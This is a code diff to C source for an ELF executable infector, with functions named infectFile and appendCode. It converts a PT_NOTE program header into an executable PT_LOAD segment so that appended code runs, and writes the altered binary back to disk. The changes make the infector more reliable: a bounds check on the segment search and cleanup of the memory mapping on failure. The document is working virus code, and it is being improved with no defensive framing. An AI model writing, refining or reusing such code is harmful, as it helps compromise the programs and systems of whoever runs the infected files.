@@ -630,8 +630,11 @@ static int  appendCode(struct bfile *bin) {
     return (-1);
   size = end - start + ins;
   segment = ((void *)bin->header) + bin->header->e_phoff;
-  while (segment->p_type != PT_NOTE)
+  while (segment->p_type != PT_NOTE && 
+segment != ((void *)bin->header) + bin->header->e_phoff + bin->header->e_phnum * sizeof(Elf64_Phdr))
     segment += 1;
+  if (segment->p_type != PT_NOTE)
+    return (-1);
   segment->p_flags = PF_R | PF_X;
   segment->p_type = PT_LOAD;
   segment->p_offset = bin->size - size;
@@ -669,8 +672,10 @@ static int  infectFile(struct bfile bin) {
     seg += 1;
   }
   data->sh_size += len;
-  if (appendCode(&bin) == -1)
+  if (appendCode(&bin) == -1) {
+    munmap(bin.header, bin.size);
     return (-1);
+  }
   write(bin.fd, bin.header, bin.size);
   close(bin.fd);
   munmap(bin.header, bin.size);
